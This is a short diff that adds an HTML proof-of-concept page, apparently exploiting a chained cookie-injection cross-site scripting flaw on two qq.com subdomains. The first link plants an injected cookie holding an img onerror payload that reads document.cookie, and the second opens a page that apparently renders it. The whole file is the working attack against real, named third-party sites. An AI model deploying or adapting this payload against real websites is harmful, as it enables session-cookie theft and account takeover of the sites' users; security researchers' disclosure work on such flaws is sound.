@@ -1,0 +1,11 @@
+<html>
+<head>
+<script src="https://code.jquery.com/jquery-2.2.3.min.js"></script>
+  <script type="text/javascript">
+  function xss()
+  {
+    setCookieUrl = 'http://gamevip.qq.com/lz_pop_15/pay_proxy.html?dna_result_key=1&PcacheTime=140000000%20_email=%3Cimg/src=x%20onerror=alert(document.cookie)%3E';        getCookieUrl = 'http://zc.qq.com/iframe/8/other_ok.html';
+    }    </script></head>
+<body>
+<button onclick="window.open(setCookieUrl)"> 1.click me </button> <button onclick="window.open(getCookieUrl)"> 2.click me </button></body>
+<script>    xss()</script></html>
